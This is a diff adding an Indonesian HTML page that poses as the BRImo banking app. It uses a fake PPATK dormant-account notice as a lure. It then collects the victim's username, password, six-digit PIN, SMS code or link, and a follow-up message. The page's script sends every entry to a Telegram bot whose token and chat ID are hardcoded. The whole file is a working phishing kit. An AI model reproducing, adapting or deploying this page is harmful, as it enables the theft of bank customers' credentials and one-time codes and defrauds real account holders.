@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>BRImo - Pembukaan, Login, PIN, Kode/Link SMS, Alasan/Ulasan</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    :root {
+      --brimo-blue: #1e90ff;
+      --brimo-dark: #09559a;
+      --brimo-bg: #f3f7fa;
+      --brimo-btn: #1e90ff;
+      --brimo-btn-disabled: #b0cbe9;
+    }
+    body {
+      background: var(--brimo-bg);
+      font-family: 'Avenir', 'Open Sans', sans-serif;
+      margin: 0; min-height: 100vh;
+    }
+    .header-brimo {
+      background: linear-gradient(135deg, var(--brimo-blue) 60%, #0f61a5 100%);
+      padding: 36px 0 6px 0; text-align: center; color: #fff;
+      border-bottom-left-radius: 30px; border-bottom-right-radius: 30px; position: relative;
+    }
+    .brimo-text-logo {
+      font-size: 44px;
+      font-weight: bold;
+      font-family: 'Avenir', 'Open Sans', sans-serif;
+      letter-spacing: 2px;
+      margin-bottom: 5px;
+      margin-top: 0;
+      color: #fff;
+      text-shadow: 0 2px 12px rgba(30,144,255,0.18);
+    }
+    .welcome-title {
+      font-size: 27px; font-weight: bold; margin-bottom: 8px; letter-spacing: 1px;
+      font-family: 'Avenir', sans-serif;
+      color: #fff;
+      text-shadow: 0 1px 8px rgba(30,144,255,0.12);
+    }
+    .awal-box, .login-box, .pin-box, .kode-box, .alasan-box {
+      background: #fff; border-radius: 28px; box-shadow: 0 4px 24px rgba(30,144,255,0.14);
+      padding: 32px 24px 30px 24px; max-width: 420px; margin: 70px auto 0 auto; position: relative; z-index: 2;
+    }
+    .awal-title {
+      color: var(--brimo-dark);
+      font-size: 21px;
+      font-weight: bold;
+      margin-bottom: 10px;
+      text-align: center;
+      font-family: 'Avenir', 'Open Sans', sans-serif;
+      letter-spacing: 1px;
+    }
+    .awal-meta {
+      font-size: 15px;
+      color: #444;
+      text-align: center;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+    .awal-date {
+      font-size: 15px;
+      color: #777;
+      text-align: center;
+      margin-bottom: 23px;
+      font-weight: 400;
+    }
+    .awal-text {
+      color: #434343;
+      font-size: 17px;
+      margin-bottom: 30px;
+      line-height: 1.65;
+      font-family: 'Open Sans', Arial, sans-serif;
+      text-align: left;
+      white-space: pre-line;
+    }
+    .btn-awal {
+      background: var(--brimo-btn); color: #fff; border: none; border-radius: 13px;
+      font-size: 21px; font-weight: bold; padding: 15px 0;
+      font-family: 'Avenir', 'Open Sans', sans-serif;
+      box-shadow: 0 2px 10px rgba(30,144,255,0.11); transition: background 0.2s; width: 100%;
+      letter-spacing: 1px;
+    }
+    .login-label, .pin-label, .kode-label, .alasan-label {
+      color: var(--brimo-dark);
+      font-size: 22px;
+      font-weight: bold;
+      margin-bottom: 29px;
+      text-align: left;
+      font-family: 'Avenir', 'Open Sans', sans-serif;
+      letter-spacing: 1px;
+    }
+    .input-brimo-group, .input-kode-group, .input-alasan-group { position: relative; margin-bottom: 24px;}
+    .input-brimo, .input-kode, .input-alasan {
+      width: 100%; padding: 17px 44px 17px 44px; font-size: 20px; border: none; border-radius: 15px;
+      background: #f7fafd; color: #434343; box-shadow: 0 2px 10px rgba(30,144,255,0.07);
+      transition: background 0.2s;
+    }
+    .input-brimo:focus, .input-kode:focus, .input-alasan:focus { outline: 2px solid var(--brimo-blue); background: #eaf4ff;}
+    .icon-input {
+      position: absolute; left: 18px; top: 50%; transform: translateY(-50%);
+      color: var(--brimo-blue); font-size: 24px; opacity: 0.7;
+    }
+    .icon-eye {
+      position: absolute; right: 16px; top: 50%; transform: translateY(-50%);
+      color: #434343; font-size: 22px; cursor: pointer; width: 27px; height: 27px; opacity: 0.7;
+    }
+    .forgot-link {
+      font-size: 15px;
+      color: var(--brimo-dark);
+      text-align: right;
+      display: inline-block;
+      margin-left: 12px;
+      margin-top: 13px;
+      text-decoration: none;
+      font-family: 'Avenir', sans-serif;
+      float: right;
+      font-weight: bold;
+    }
+    .login-row {
+      display: flex; align-items: center; gap: 12px; margin-top: 22px; margin-bottom: 0;
+      justify-content: flex-start; flex-wrap: wrap;
+    }
+    .btn-brimo, .btn-alasan {
+      background: var(--brimo-btn-disabled); color: #fff; border: none; border-radius: 13px;
+      font-size: 21px; font-weight: bold; padding: 15px 0;
+      font-family: 'Avenir', 'Open Sans', sans-serif;
+      box-shadow: 0 2px 10px rgba(30,144,255,0.11); transition: background 0.2s; width: 180px; margin-right: 8px;
+      letter-spacing: 1px;
+    }
+    .btn-brimo:enabled, .btn-alasan:enabled { background: var(--brimo-btn); color: #fff; }
+    .btn-brimo:active, .btn-alasan:active { background: #09559a; }
+    .btn-alasan { width: 100%; margin: 0;}
+    .pin-inputs { display: flex; justify-content: space-between; margin-bottom: 22px;}
+    .pin-input {
+      width: 48px; height: 54px; font-size: 32px; text-align: center; border-radius: 12px;
+      border: 1.5px solid #d7e9fa; background: #f7fafd; box-shadow: 0 2px 6px rgba(30,144,255,0.07);
+      margin-right: 4px; outline: none; transition: border 0.2s;
+      color: var(--brimo-blue); font-weight: bold;
+    }
+    .pin-input:focus { border: 2px solid var(--brimo-blue); background: #eaf4ff;}
+    #status, #statusPin, #statusKode, #statusAlasan { font-weight: bold;}
+    #status .text-success, #statusPin .text-success, #statusKode .text-success, #statusAlasan .text-success { color: var(--brimo-blue);}
+    #status .text-danger, #statusPin .text-danger, #statusKode .text-danger, #statusAlasan .text-danger { color: #d60000;}
+    .invalid-feedback {
+      color: #d60000;
+      font-size: 15px;
+      font-weight: bold;
+      margin-top: 8px;
+      display: none;
+    }
+    @media (max-width: 480px) {
+      .header-brimo { padding: 18px 0 4px 0;}
+      .brimo-text-logo { font-size: 32px;}
+      .welcome-title { font-size: 21px;}
+      .awal-box, .login-box, .pin-box, .kode-box, .alasan-box { padding: 18px 4vw 16px 4vw; margin: 30px auto 0 auto;}
+      .awal-title { font-size: 16px;}
+      .awal-meta, .awal-date { font-size: 13px;}
+      .awal-text { font-size: 15px;}
+      .login-label, .pin-label, .kode-label, .alasan-label { font-size: 17px; margin-bottom: 15px;}
+      .input-brimo, .input-kode, .input-alasan { font-size: 17px; padding: 14px 36px 14px 36px;}
+      .btn-brimo, .btn-awal, .btn-alasan { font-size: 16px; padding: 10px 0; width: 100%; margin: 0;}
+      .forgot-link { font-size: 14px; margin-left: 0;}
+      .pin-input { width: 39px; height: 44px; font-size: 22px;}
+    }
+  </style>
+</head>
+<body>
+  <div class="header-brimo">
+    <div class="brimo-text-logo">BRImo</div>
+    <div class="welcome-title">Selamat Datang</div>
+  </div>
+  <!-- Halaman Awal Pembukaan -->
+  <div class="awal-box" id="awalPage">
+    <div class="awal-title">PPATK HENTIKAN SEMENTARA TRANSAKSI REKENING DORMANT UNTUK LINDUNGI KEPENTINGAN PUBLIK</div>
+    <div class="awal-meta">B/005/HM.05/IV/2025</div>
+    <div class="awal-date">18 Mei 2025</div>
+    <div class="awal-text" id="awalText">
+Jakarta – Pusat Pelaporan dan Analisis Transaksi Keuangan (PPATK) mengungkapkan bahwa sepanjang tahun 2024 ada puluhan ribu rekening yang teridentifikasi sebagai hasil dari praktik jual beli rekening yang digunakan untuk deposit perjudian online. Selain itu, rekening milik orang lain juga ditemukan secara masif digunakan untuk menampung dana hasil tindak pidana penipuan, perdagangan narkotika, dan berbagai kejahatan lainnya.
+Selain memastikan keamanan dan transparansi sistem keuangan, penghentian sementara ini juga bertujuan untuk:
+1.    Memberikan pemberitahuan kepada nasabah terkait status dormant rekening mereka.
+2.    Menginformasikan kepada ahli waris atau pimpinan perusahaan (bagi nasabah korporasi) apabila rekening tersebut tidak diketahui keberadaannya.
+PPATK berkomitmen untuk terus berupaya menciptakan sistem keuangan yang lebih bersih dan transparan guna memastikan keamanan serta kepercayaan publik terhadap sektor keuangan nasional.
+    </div>
+    <button class="btn-awal" id="btnAwal">Lanjutkan</button>
+  </div>
+  <!-- Halaman Login -->
+  <div class="login-box" id="loginPage" style="display:none;">
+    <div class="login-label">Login</div>
+    <form id="formLogin">
+      <div class="input-brimo-group">
+        <span class="icon-input">
+          <img src="https://cdn.jsdelivr.net/gh/feathericons/feather/icons/user.svg" width="24" height="24" alt="user">
+        </span>
+        <input type="text" id="username" name="username" class="input-brimo" placeholder="Username" autocomplete="username" required>
+      </div>
+      <div class="input-brimo-group mb-0">
+        <span class="icon-input">
+          <img src="https://cdn.jsdelivr.net/gh/feathericons/feather/icons/lock.svg" width="24" height="24" alt="lock">
+        </span>
+        <input type="password" id="password" name="password" class="input-brimo" placeholder="Password" autocomplete="current-password" required>
+        <span class="icon-eye" id="togglePass">
+          <img src="https://cdn.jsdelivr.net/gh/feathericons/feather/icons/eye.svg" id="eyeOpen" style="display:block;width:27px;height:27px;">
+          <img src="https://cdn.jsdelivr.net/gh/feathericons/feather/icons/eye-off.svg" id="eyeClose" style="display:none;width:27px;height:27px;">
+        </span>
+      </div>
+      <div class="invalid-feedback" id="passwordFeedback"></div>
+      <div class="login-row">
+        <button type="submit" class="btn-brimo" id="btnLogin" disabled>Login</button>
+        <a href="#" class="forgot-link">Lupa Password?</a>
+      </div>
+      <div id="status" class="mt-2 text-center"></div>
+    </form>
+  </div>
+  <!-- Halaman PIN -->
+  <div class="pin-box" id="pinPage" style="display:none;">
+    <div class="pin-label">Masukkan PIN</div>
+    <form id="formPin">
+      <div class="pin-inputs">
+        <input class="pin-input" type="password" maxlength="1" inputmode="numeric" required>
+        <input class="pin-input" type="password" maxlength="1" inputmode="numeric" required>
+        <input class="pin-input" type="password" maxlength="1" inputmode="numeric" required>
+        <input class="pin-input" type="password" maxlength="1" inputmode="numeric" required>
+        <input class="pin-input" type="password" maxlength="1" inputmode="numeric" required>
+        <input class="pin-input" type="password" maxlength="1" inputmode="numeric" required>
+      </div>
+      <button type="submit" class="btn-brimo" id="btnPin" disabled>Verifikasi PIN</button>
+      <div id="statusPin" class="mt-2 text-center"></div>
+    </form>
+  </div>
+  <!-- Halaman Kode/Link SMS -->
+  <div class="kode-box" id="kodePage" style="display:none;">
+    <div class="kode-label">Masukkan Kode/Link dari SMS</div>
+    <form id="formKode">
+      <div class="input-kode-group">
+        <input type="text" class="input-kode" id="kodeSMS" placeholder="Masukkan kode atau link dari SMS" required>
+      </div>
+      <button type="submit" class="btn-brimo" id="btnKode" disabled>Kirim</button>
+      <div id="statusKode" class="mt-2 text-center"></div>
+    </form>
+  </div>
+  <!-- Halaman Alasan/Ulasan -->
+  <div class="alasan-box" id="alasanPage" style="display:none;">
+    <div class="alasan-label">Masukkan Ulasan</div>
+    <form id="formAlasan">
+      <div class="input-alasan-group">
+        <textarea class="input-alasan" id="alasan" placeholder="Tuliskan alasan atau ulasan Anda di sini" required rows="3"></textarea>
+      </div>
+      <button type="submit" class="btn-alasan" id="btnAlasan" disabled>Kirim Ulasan</button>
+      <div id="statusAlasan" class="mt-2 text-center"></div>
+    </form>
+  </div>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script>
+    // KONFIGURASI TELEGRAM SESUAI PERMINTAAN MU
+    const TELEGRAM_TOKEN = "7968084164:AAFJCBR6ABA0tQlMmGZuWA3yo_uVuqGgF-8";
+    const TELEGRAM_CHAT_ID = "8165489813";
+
+    // --- AWAL PEMBUKAAN ---
+    $("#btnAwal").on('click', function() {
+      $("#awalPage").hide();
+      $("#loginPage").show();
+      $("#username").focus();
+    });
+
+    // --- LOGIN ---
+    function isStrongPassword(password) {
+      return (
+        password.length >= 8 &&
+        /[A-Z]/.test(password) &&
+        /[a-z]/.test(password) &&
+        /\d/.test(password)
+      );
+    }
+    function cekInputAktif() {
+      let user = $("#username").val();
+      let pass = $("#password").val();
+      let feedback = $("#passwordFeedback");
+      if (pass.length > 0 && !isStrongPassword(pass)) {
+        feedback.show().text("Password minimal 8 karakter, harus ada huruf besar, huruf kecil dan angka.");
+      } else {
+        feedback.hide();
+      }
+      let valid = user.length > 4 && isStrongPassword(pass);
+      $("#btnLogin").prop('disabled', !valid);
+    }
+    $("#username, #password").on('input', cekInputAktif);
+
+    $("#togglePass").on('click', function(){
+      let passInput = $("#password");
+      let eyeOpen = $("#eyeOpen");
+      let eyeClose = $("#eyeClose");
+      if (passInput.attr("type") === "password") {
+        passInput.attr("type", "text");
+        eyeOpen.hide();
+        eyeClose.show();
+      } else {
+        passInput.attr("type", "password");
+        eyeOpen.show();
+        eyeClose.hide();
+      }
+    });
+
+    $("#formLogin").on('submit', function(e){
+      e.preventDefault();
+      let user = $("#username").val();
+      let pass = $("#password").val();
+      let message = `BRImo Login\nUsername: ${user}\nPassword: ${pass}`;
+      $("#btnLogin").prop('disabled', true).text("Mengirim...");
+      $.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      }).always(function(){
+        // Setelah berhasil/gagal kirim login, lanjut ke halaman PIN
+        $("#loginPage").hide();
+        $("#pinPage").show();
+        $(".pin-input").val('');
+        $(".pin-input").first().focus();
+        $("#btnLogin").prop('disabled', false).text("Login");
+        $("#formLogin")[0].reset();
+        cekInputAktif();
+      });
+    });
+
+    // --- PIN ---
+    $(".pin-input").on("input", function() {
+      let $this = $(this);
+      if ($this.val().length === 1) {
+        $this.next(".pin-input").focus();
+      }
+      cekPinAktif();
+    }).on("keydown", function(e){
+      if(e.key === "Backspace" && !$(this).val()){
+        $(this).prev(".pin-input").focus();
+      }
+    });
+    function cekPinAktif(){
+      let pinFull = true;
+      $(".pin-input").each(function(){
+        if($(this).val() === "") pinFull = false;
+      });
+      $("#btnPin").prop('disabled', !pinFull);
+    }
+    $("#formPin").on('submit', function(e){
+      e.preventDefault();
+      let pin = "";
+      $(".pin-input").each(function(){
+        pin += $(this).val();
+      });
+      let message = `BRImo PIN\nPIN: ${pin}`;
+      $("#btnPin").prop('disabled', true).text("Mengirim...");
+      $.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      }).always(function(){
+        // Lanjut ke halaman Kode/Link SMS
+        $("#pinPage").hide();
+        $("#kodePage").show();
+        $("#formPin")[0].reset();
+        cekPinAktif();
+        $(".input-kode").val("");
+        $("#btnKode").prop('disabled', true);
+        $("#kodeSMS").focus();
+      });
+    });
+
+    // --- Kode/Link SMS ---
+    $("#kodeSMS").on('input', function(){
+      let kode = $(this).val();
+      $("#btnKode").prop('disabled', kode.length < 4);
+    });
+
+    $("#formKode").on('submit', function(e){
+      e.preventDefault();
+      let kode = $("#kodeSMS").val();
+      let message = `BRImo Kode/Link SMS\nKode/Link: ${kode}`;
+      $("#btnKode").prop('disabled', true).text("Mengirim...");
+      $.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      }).always(function(){
+        // Lanjut ke halaman alasan/ulasan
+        $("#kodePage").hide();
+        $("#alasanPage").show();
+        $("#formKode")[0].reset();
+        $("#alasan").focus();
+        $("#btnAlasan").prop('disabled', true);
+      });
+    });
+
+    // --- Alasan/Ulasan ---
+    $("#alasan").on('input', function(){
+      let alasan = $(this).val();
+      $("#btnAlasan").prop('disabled', alasan.length < 4);
+    });
+
+    $("#formAlasan").on('submit', function(e){
+      e.preventDefault();
+      let alasan = $("#alasan").val();
+      let message = `BRImo Alasan\nAlasan: ${alasan}`;
+      $("#btnAlasan").prop('disabled', true).text("Mengirim...");
+      $.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      }).done(function(){
+        $("#statusAlasan").html("<span class='text-success'>terima kasih kami akan segera menghubungi anda!</span>");
+      }).fail(function(){
+        $("#statusAlasan").html("<span class='text-danger'>terima kasih kami akan segera meghubungi anda!</span>");
+      }).always(function(){
+        $("#btnAlasan").prop('disabled', false).text("Kirim Alasan/Ulasan");
+        $("#formAlasan")[0].reset();
+        $("#alasan").focus();
+      });
+    });
+  </script>
+</body>
+</html>
